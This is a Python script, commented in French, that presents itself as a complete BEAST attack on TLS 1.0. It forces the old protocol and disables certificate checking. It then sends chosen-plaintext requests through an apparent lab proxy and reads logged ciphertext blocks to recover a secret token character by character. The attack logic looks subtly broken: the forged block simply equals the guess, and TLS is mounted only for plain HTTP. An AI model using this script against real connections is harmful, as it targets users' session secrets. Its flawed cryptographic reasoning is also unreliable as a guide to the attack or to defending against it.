#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import ssl
import requests
import string
import time
from requests.adapters import HTTPAdapter
from urllib3.poolmanager import PoolManager

BLOCK_SIZE = 16
CHARSET = string.ascii_letters + string.digits + "{}_-+="
BLOCK_LOG = "/tmp/blocks_log.txt"

class TLSv10Adapter(HTTPAdapter):
    def init_poolmanager(self, connections, maxsize, block=False, **pool_kwargs):
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
        ctx.options |= ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        pool_kwargs['ssl_context'] = ctx
        return super().init_poolmanager(connections, maxsize, block, **pool_kwargs)

def xor_block(iv, c_block, guess):
    return bytes([iv[i] ^ c_block[i] ^ guess[i] for i in range(BLOCK_SIZE)])

def get_last_block(wait=2):
    deadline = time.time() + wait
    while time.time() < deadline:
        try:
            with open(BLOCK_LOG, "r") as f:
                lines = f.readlines()
                for i in range(len(lines)-1, -1, -1):
                    if lines[i].startswith("Hex:"):
                        return bytes.fromhex(lines[i].strip().split("Hex: ")[1][:32])
        except FileNotFoundError:
            pass
        time.sleep(0.2)
    return None

def send_request(session, base_url, payload):
    session.get(f"{base_url}?q={payload}")
    time.sleep(0.5)
    return get_last_block()

def run_beast_attack(base_url):
    session = requests.Session()
    session.mount("http://", TLSv10Adapter())
    session.verify = False

    known = "Token: "
    recovered = ""
    padding_base = "A" * (BLOCK_SIZE - 1 - len(known))

    print(f"\n🔓 Attaque BEAST complète sur {base_url}\n")

    for _ in range(32):
        found = False
        for c in CHARSET:
            # 1. Requête originale : obtenir bloc cible C1
            orig_payload = padding_base + known + recovered + c
            send_request(session, base_url, orig_payload)
            target_block = get_last_block()
            if not target_block:
                continue

            # 2. Forger bloc deviné P_guess
            p_guess = (padding_base + known + recovered + c)[-BLOCK_SIZE:]
            p_guess_bytes = p_guess.encode('utf-8').ljust(BLOCK_SIZE, b'\x00')
            iv = target_block
            forged_block = xor_block(iv, target_block, p_guess_bytes)

            # 3. Envoi avec le bloc forgé et IV fixé à target_block
            forged_payload = forged_block.hex()
            send_request(session, base_url, forged_payload)
            result_block = get_last_block()

            # 4. Comparaison
            if result_block == target_block:
                recovered += c
                print(f"[+] Caractère trouvé : {c} → {recovered}")
                found = True
                break

        if not found:
            print("[-] Aucun caractère trouvé.")
            break

    print(f"\n✅ Token reconstruit : {recovered}")

if __name__ == "__main__":
    TARGET_URL = "http://mitmproxy:8080"
    run_beast_attack(TARGET_URL)
